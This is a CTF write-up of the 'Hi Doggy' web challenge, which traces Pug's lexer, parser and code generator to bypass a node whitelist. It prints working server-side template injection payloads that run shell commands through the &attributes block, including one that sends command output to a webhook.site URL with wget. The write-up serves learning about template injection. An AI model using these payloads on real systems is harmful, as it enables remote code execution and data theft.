viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div><div class="dotted-line-vert h-auto mb-10"></div></div><div class="relative flex flex-col items-center break-words max-w-[89rem] mx-auto px-[20.5rem] pt-24 pb-14 max-xl:ml-0 max-xl:pl-12 max-lg:mr-0 max-lg:pr-12 max-md:px-8 max-sm:px-5"><div class="w-full flex flex-col items-start"><span class="text-xl opacity-40 mb-1">29/07/2024</span><h1 class="mb-7">Hi Doggy</h1><div class="markdown mb-7 flex flex-col gap-y-3"><p>I figured out the best defence against SSTI, just remove the stuff that can execute code from the template! I even used a whitelist like the pros tell you to do!</p>
<p><a href="http://challs.nusgreyhats.org:33433/">http://challs.nusgreyhats.org:33433/</a></p>
</div><div class="flex flex-wrap gap-3"><!--[--><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">language</i><span class="mr-4 text-black font-semibold">web</span></div><!--]--><div class="h-9 bg-almost-black rounded-full px-5 flex items-center"><span class="mr-4">4 solves</span><span class="opacity-60">968 points</span></div><div class="h-9 bg-almost-black rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-3">person</i><span class="mr-4">by devesh</span></div></div><div class="w-full flex border border-almost-black-lighter rounded-2.5xl mt-7 mb-9 max-sm:flex-col"><div class="flex-1 flex flex-col gap-y-2 px-6 pt-4 pb-5"><span>Attachments</span><!--[--><a href="https://ctfd.nusgreyhats.org/files/2ff82bee8684e96e347fe9de0a744dd2/dist-hi-doggy.zip?token=eyJ1c2VyX2lkIjozNSwidGVhbV9pZCI6MTEsImZpbGVfaWQiOjM3fQ.Zqcayw.wKbYG8wRwpZ2VZUC7TkEESrBueo" class="underline">dist-hi-doggy.zip</a><!--]--></div><button class="pl-9 pr-10 font-semibold flex items-center border-l border-almost-black-lighter rounded-tr-2.5xl rounded-br-2.5xl transition-colors hover:bg-almost-black active:bg-almost-black-lighter max-sm:border-l-0 max-sm:border-t max-sm:pl-6 max-sm:py-4 max-sm:rounded-tr-none max-sm:rounded-bl-2.5xl"><i class="material-symbols-outlined text-2xl mr-4">download</i> Download all </button></div></div><div id="article" class="markdown w-full flex flex-col gap-y-3 px-4 max-md:px-0"><p>This was the first challenge I solved during the CTF and it was also a first blood, which I was quite happy about.</p>
<h1 id="challenge-overview" tabindex="-1">Challenge overview</h1>
<p>The code is rather short, and the main part is as follows:</p>
<pre class="named-fence-block"><code class="language-javascript">app.post('/render', (req, res) =&gt; {
  const { template } = req.body;

  try {
    var lex = require('pug-lexer');
    var parse = require('pug-parser');
    var wrap = require('pug-runtime/wrap');
    var generateCode = require('pug-code-gen');

    const ast = parse(lex(template));
    console.dir(ast);
    const whitelistedNodes = ['Tag', 'Text', 'Comment', 'Block', 'Doctype', 'NamedBlock'];
    const filterNodes = (node) =&gt; {
      if (whitelistedNodes.includes(node.type)) {
        if (node.nodes) {
          node.nodes = node.nodes.map(filterNodes).filter(Boolean);
        }
        if (node.block) {
          node.block = filterNodes(node.block);
        }
        return node;
      }
    };
    const filteredAst = filterNodes(ast);
    const validateAttrs = (node) =&gt; {
      if (node.attrs) {
        node.attrs.forEach((attr) =&gt; {
          if (!/^(['"])(?:(?:(?!\1).)|\\.)*\1$/.test(attr.val)) {
            throw new Error('Invalid attribute value: ' + attr.val);
          }
        });
      }
      if (node.nodes) {
        node.nodes.forEach(validateAttrs);
      }
      if (node.block) {
        validateAttrs(node.block);
      }
    };
    validateAttrs(filteredAst);
    const code = generateCode(filteredAst);
    console.log(code);
    const html = wrap(code)();

    res.send(html);
  } catch (error) {
    res.status(400).send(`Error rendering template: ${error.message}`);
  }
});
</code><div class="named-fence-filename">index.js</div></pre>
<p>So, it is clearly SSTI with some filters (an SSTI jail, if you will). A whitelist instead of a blacklist narrows the search space quite a lot. So I dived right into the <a href="https://github.com/pugjs/pug">Pug source code</a>. Under the <code>pug/packages</code> folder, there are 3 main directories of interest: <code>pug-lexer</code>, <code>pug-parser</code>, and <code>pug-code-gen</code>.</p>
<p>Here is a brief description of my understanding of how it works. A lexer converts raw string input into a sequence of tokens, such as numbers/symbols/identifiers. A parser then takes the sequence of tokens as input and constructs a sort of abstract syntax tree (AST), another abstraction that organises the data further. Finally, the code generator takes this AST and compiles it to javascript code by recursively visiting each node in the tree. This javascript code is then executed server side to produce the final HTML file sent to the client.</p>
<h1 id="pug-source-code" tabindex="-1">Pug source code</h1>
<p>So with this in mind, it would be a good idea to start looking in <code>pug-code-gen</code> to try and find an entrypoint for us to inject our JS code. I looked up how code is generated for each whitelisted node type. <code>visitTag</code> seemed to be the most promising:</p>
<pre class="named-fence-block"><code class="language-javascript">  visitTag: function(tag, interpolated) {
...

    function bufferName() {
      if (interpolated) self.bufferExpression(tag.expr);
      else self.buffer(name);
    }

...
</code><div class="named-fence-filename">pug-code-gen/index.js</div></pre>
<p>Here, if <code>interpolated</code> is true, <code>this.bufferExpression</code> is called.</p>
<pre class="named-fence-block"><code class="language-javascript">  /**
   * Buffer the given `src` so it is evaluated at run time
   *
   * @param {String} src
   * @api public
   */

  bufferExpression: function(src) {
    if (isConstant(src)) {
      return this.buffer(toConstant(src) + '');
    }
    if (
      this.lastBufferedIdx == this.buf.length &amp;&amp;
      this.bufferedConcatenationCount &lt; 100
    ) {
      this.bufferedConcatenationCount++;
      if (this.lastBufferedType === 'text') this.lastBuffered += '"';
      this.lastBufferedType = 'code';
      this.lastBuffered += ' + (' + src + ')';
      this.buf[this.lastBufferedIdx - 1] =
        'pug_html = pug_html + (' +
        this.bufferStartChar +
        this.lastBuffered +
        ');';
    } else {
      this.bufferedConcatenationCount = 0;
      this.buf.push('pug_html = pug_html + (' + src + ');');
      this.lastBufferedType = 'code';
      this.bufferStartChar = '';
      this.lastBuffered = '(' + src + ')';
      this.lastBufferedIdx = this.buf.length;
    }
  },
</code><div class="named-fence-filename">pug-code-gen/index.js</div></pre>
<p>From this information I deduced that the function is called whenever Pug wants to add raw JS code to the compilation result. It has a sister function <code>buffer</code>, which as the documentation suggests wraps the data in a string before adding it to the JS code:</p>
<pre class="named-fence-block"><code class="language-javascript">  /**
   * Buffer the given `str` exactly as is or with interpolation
   *
   * @param {String} str
   * @param {Boolean} interpolate
   * @api public
   */

  buffer: function(str) {
    var self = this;

    str = stringify(str);
    str = str.substr(1, str.length - 2);

    if (
      this.lastBufferedIdx == this.buf.length &amp;&amp;
      this.bufferedConcatenationCount &lt; 100
    ) {
      if (this.lastBufferedType === 'code') {
        this.lastBuffered += ' + "';
        this.bufferedConcatenationCount++;
      }
      this.lastBufferedType = 'text';
      this.lastBuffered += str;
      this.buf[this.lastBufferedIdx - 1] =
        'pug_html = pug_html + ' +
        this.bufferStartChar +
        this.lastBuffered +
        '";';
    } else {
      this.bufferedConcatenationCount = 0;
      this.buf.push('pug_html = pug_html + "' + str + '";');
      this.lastBufferedType = 'text';
      this.bufferStartChar = '"';
      this.lastBuffered = str;
      this.lastBufferedIdx = this.buf.length;
    }
  },
</code><div class="named-fence-filename">pug-code-gen/index.js</div></pre>
<p>So it seems like most of the JS code generation is done through these 2 helper functions and thus the vulnerable code, whereever it is, probably calls <code>bufferExpression</code>.</p>
<p>Back to <code>visitTag</code>, I searched for where it is called with <code>interpolated = true</code>. It turns out this is only the case for an <code>InterpolatedTag</code> node:</p>
<pre class="named-fence-block"><code class="language-javascript">  visitInterpolatedTag: function(tag) {
    return this.visitTag(tag, true);
  },
</code><div class="named-fence-filename">pug-code-gen/index.js</div></pre>
<p>However, <code>InterpolatedTag</code> is not one of the nodes in our whitelist. So we have to search somewhere else. I searched for all invocations of <code>this.bufferExpression</code> in the code (there are about 6). The one that seemed most relevant was in the <code>visitAttributes</code> function</p>
<pre class="named-fence-block"><code class="language-javascript">  visitAttributes: function(attrs, attributeBlocks) {
    if (attributeBlocks.length) {
      if (attrs.length) {
        var val = this.attrs(attrs);
        attributeBlocks.unshift(val);
      }
      if (attributeBlocks.length &gt; 1) {
        this.bufferExpression(
          this.runtime('attrs') +
            '(' +
            this.runtime('merge') +
            '([' +
            attributeBlocks.join(',') +
            ']), ' +
            stringify(this.terse) +
            ')'
        );
      } else {
        this.bufferExpression(
          this.runtime('attrs') +
            '(' +
            attributeBlocks[0] +
            ', ' +
            stringify(this.terse) +
            ')'
        );
      }
    } else if (attrs.length) {
      this.attrs(attrs, true);
    }
  },
</code><div class="named-fence-filename">pug-code-gen/index.js</div></pre>
<p>Recalling the SSTI filter for this challenge, there is also a check done for attributes:</p>
<pre class="named-fence-block"><code class="language-javascript">node.attrs.forEach((attr) =&gt; {
  if (!/^(['"])(?:(?:(?!\1).)|\\.)*\1$/.test(attr.val)) {
    throw new Error('Invalid attribute value: ' + attr.val);
  }
});
</code><div class="named-fence-filename">index.js</div></pre>
<p>ChatGPT told me that this regex checks that the attribute value is in an unescaped string. I scrutinized the regex and verified this through testing. So we can't inject through tag attributes, however there is the <code>attributeBlocks</code> parameter which is clearly injectable! But can we control it? It seems like <code>attributeBlocks</code> is a member of <code>tag</code>, and I eventually traced it its origin back to <code>pug-parser</code>. Here it is initialized in <code>parseTag</code>:</p>
<pre class="named-fence-block"><code class="language-javascript">  /**
   * tag (attrs | class | id)* (text | code | ':')? newline* block?
   */

  parseTag: function() {
    var tok = this.advance();
    var tag = {
      type: 'Tag',
      name: tok.val,
      selfClosing: false,
      block: this.emptyBlock(tok.loc.start.line),
      attrs: [],
      attributeBlocks: [], // &lt;-- here!
      isInline: inlineTags.indexOf(tok.val) !== -1,
      line: tok.loc.start.line,
      column: tok.loc.start.column,
      filename: this.filename,
    };

    return this.tag(tag, {selfClosingAllowed: true});
  },
</code><div class="named-fence-filename">pug-parser/index.js</div></pre>
<p>This attribute is only written to in one function:</p>
<pre class="named-fence-block"><code class="language-javascript">  tag: function(tag, options) {
    var seenAttrs = false;
    var attributeNames = [];
    var selfClosingAllowed = options &amp;&amp; options.selfClosingAllowed;
    // (attrs | class | id)*
    out: while (true) {
      switch (this.peek().type) {
        ...
        case '&amp;attributes':
          var tok = this.advance();
          tag.attributeBlocks.push({
            type: 'AttributeBlock',
            val: tok.val,
            line: tok.loc.start.line,
            column: tok.loc.start.column,
            filename: this.filename,
          });
          break;
        ...
</code><div class="named-fence-filename">pug-parser/index.js</div></pre>
<p>A google search sheds more light onto what this is: <a href="https://pugjs.org/language/attributes.html#attributes">Pug attributes</a></p>
<pre><code class="language-plaintext">Pronounced as “and attributes”, the &amp;attributes syntax can be used to explode an object into attributes of an element.

div#foo(data-bar="foo")&amp;attributes({'data-foo': 'bar'})

&lt;div id="foo" data-bar="foo" data-foo="bar"&gt;&lt;/div&gt;
</code></pre>
<p>So after the <code>&amp;attributes</code> token, we take the next token and set it as the <code>val</code>. And later in <code>pug-code-gen</code>, this val is inserted directly into the JS code without validation or stringifying it! I looked into <code>pug-lexer</code> to see what type of token would be best suited for this. Then I found the code where an attributeBlock is lexed:</p>
<pre class="named-fence-block"><code class="language-javascript">  /**
   * &amp;attributes block
   */
  attributesBlock: function() {
    if (/^&amp;attributes\b/.test(this.input)) {
      var consumed = 11;
      this.consume(consumed);
      var tok = this.tok('&amp;attributes');
      this.incrementColumn(consumed);
      var args = this.bracketExpression();
      consumed = args.end + 1;
      this.consume(consumed);
      tok.val = args.src;
      this.incrementColumn(consumed);
      this.tokens.push(this.tokEnd(tok));
      return true;
    }
  },
</code><div class="named-fence-filename">pug-lexer/index.js</div></pre>
<p>As you can see, only a <code>bracketExpression</code> is allowed after the <code>&amp;attributes</code> token.</p>
<pre class="named-fence-block"><code class="language-javascript">  bracketExpression: function(skip) {
    skip = skip || 0;
    var start = this.input[skip];
    assert(
      start === '(' || start === '{' || start === '[',
      'The start character should be "(", "{" or "["'
    );
</code><div class="named-fence-filename">pug-lexer/index.js</div></pre>
<p>So we can use <code>()</code>, <code>[]</code> or <code>{}</code> brackets, and the token value will be everything in between. I chose curly brackets so that I could make function calls in the code without ambiguity, and tested the following payload locally:</p>
<pre><code class="language-plaintext">div&amp;attributes{global.process.mainModule.constructor._load("child_process").execSync('touch pwned.txt')}
</code></pre>
<h1 id="testing-environment-setup" tabindex="-1">Testing environment setup</h1>
<p>At this point it may be a good idea to briefly describe how I set up the environment for testing locally. The relevant dockerfiles were provided along with the source code, but I just ran node from my machine because it was faster (and the behavior probably won't have significant changes). I just added two print statements, a <code>console.dir(ast)</code> to see the node types, and a <code>console.log(code)</code> at the end to check the JS code run.</p>
<h1 id="final-payload" tabindex="-1">Final payload</h1>
<p>Going back to the challenge, the payload I submitted worked flawlessly. The problem now is that there isn't a straightforward way to display the command result, so I made a call to a webhook.site.</p>
<pre><code class="language-plaintext">div&amp;attributes{global.process.mainModule.constructor._load("child_process").execSync('wget https://webhook.site/6964b783-05f8-4a10-be20-817e961902bb?t=`/readflag GIVEFLAGPLS`')}
</code></pre>
<p>In retrospect, webhook was unnecessary, and I could just as well have done:</p>
<pre><code class="language-plaintext">input&amp;attributes({value: global.process.mainModule.constructor._load("child_process").execSync('/readflag GIVEFLAGPLS').toString()})
</code></pre>
<p>In either case, I got the flag: <code>grey{I_cAn'T_THInK_0F_AnytHing_clever_T0_pu7_h3r3}</code>.</p>
<p>Overall, quite a cool challenge that tests your code-auditing abilities.</p>
</div><div class="fixed w-[17.5rem] h-full top-0 right-0 pointer-events-none pr-8 max-lg:hidden"><!----></div></div><!----></div></div>
    
  

</body></html>